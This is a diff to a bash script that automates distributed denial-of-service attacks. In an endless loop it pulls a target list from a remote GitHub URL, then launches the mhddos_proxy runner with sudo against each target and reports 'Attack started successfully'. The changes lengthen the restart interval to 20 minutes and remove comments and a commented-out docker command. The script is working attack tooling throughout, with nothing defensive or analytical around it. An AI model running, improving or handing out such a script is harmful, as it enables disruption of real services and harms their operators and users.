@@ -62,12 +62,10 @@ echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack
 sleep 7s
 
 
-# Restart attacks and update targets list every 10 minutes (by default)
+# Restart attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
-	   	
-	
-   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_docker | cat | grep "^[^#]" | wc -l)
 	
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
@@ -111,7 +109,6 @@ do
             echo "sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
-            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $rpc
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
